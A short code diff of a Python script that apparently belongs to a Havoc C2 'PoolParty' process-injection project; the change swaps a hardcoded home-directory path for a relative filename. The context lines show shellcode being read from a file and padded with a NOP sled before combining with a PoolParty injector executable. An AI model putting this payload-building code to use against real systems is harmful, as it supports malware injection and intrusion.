@@ -11,8 +11,7 @@ def main():
     raw_file_path = args.raw_file
     shellcode = open(raw_file_path, "rb").read()
 
-    cwd = "/home/cipher/Github/havoc-PoolParty"
-    poolparty = open(f"{cwd}/PoolParty/PoolParty-master.exe", "rb").read()
+    poolparty = open(f"PoolParty-master.exe", "rb").read()
     nops = 200000 - len(shellcode)
 
     payload = b'\x90' * nops + shellcode
